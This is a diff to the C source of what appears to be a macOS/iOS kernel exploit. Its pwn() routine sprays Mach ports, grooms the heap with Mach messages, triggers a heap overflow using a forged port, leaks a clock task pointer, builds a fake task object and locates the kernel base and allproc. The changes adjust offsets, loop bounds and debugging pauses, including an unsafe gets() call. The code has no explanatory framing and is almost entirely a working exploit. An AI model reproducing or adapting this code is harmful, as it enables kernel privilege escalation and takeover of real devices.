@@ -144,8 +144,8 @@ int do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflo
     
     void* recipe_size = (void*)map(pagesize);
     printf("%p\n",recipe_size);
-    if((int)recipe_size>=0x4000000)
-        return -1;
+    //if((int)recipe_size>=0x4000000)
+    //    return -1;
     puts("addr ok");
     *(uint64_t*)recipe_size = kalloc_size;
     
@@ -190,7 +190,7 @@ int pwn()
     fakeport->io_lock_data[12] = 0x11;
     char *buf;
     buf=(char *)fakeport;
-    buf[0xa0]=1;
+    //buf[0xa0]=1;
     mach_port_t* ports = calloc(800, sizeof(mach_port_t));
     
     for (int i = 0; i < 800; i++) {
@@ -229,14 +229,14 @@ int pwn()
     
     // recv 300 - 500 i+=4
     pthread_yield_np();
-    for (int i = 380; i<500; i+=4) {
+    for (int i = 384; i<500; i+=4) {
         msg2.head.msgh_local_port = ports[i];
         kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
         if(!(i < 380))
             ports[i] = 0;
         assert(kret==0);
     }
-    
+    /*
     //send 300 - 380 i+=4
     pthread_yield_np();
     for (int i = 300; i<380; i+=4) {
@@ -244,13 +244,12 @@ int pwn()
         kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
         assert(kret==0);
     }
-     
+    */
     //fakeport=0x6161616161616161;
     //heap overflow here!
     if(do_overflow(0x100, 8, (uint8_t*)&fakeport)==-1)
         return -1;
-    char a[0x10];
-    gets(a);
+
     // 300 - 500 find overflow port
     mach_port_t foundport = 0;
     for (int i=300; i<500; i++) {
@@ -302,6 +301,7 @@ foundp:
     }
     
     printf("can't find clock task.\n");
+
     return -1;
     
     //found clock task
@@ -309,18 +309,20 @@ gotclock:;
     uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
     printf("clock task ptr = 0x%llx\n",leaked_ptr);
     leaked_ptr &= ~0xFFFFF;
-    
-    
+ 
+  
     
     fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
     fakeport->io_references = 0xff;
     char* faketask = ((char*)fakeport) + 0x1000;
-    
+  
     *(uint64_t*)(((uint64_t)fakeport) + 0x68) =(uint64_t) faketask;
     *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
     *(uint64_t*) (faketask + 0x10) = 0xee;
-    
-    
+    printf("leak = 0x%llx\n",leaked_ptr);
+
+    char a[0x10];
+    gets(a);
     
     while (1) {
         int32_t leaked = 0;
@@ -335,7 +337,7 @@ gotclock:;
     //found kernel base
     uint64_t kernel_base = leaked_ptr;
     
-    uint64_t allproc_offset = 0xaf6a28;
+    uint64_t allproc_offset = 0x8bc490;
     
     uint64_t allproc = allproc_offset + kernel_base;
     
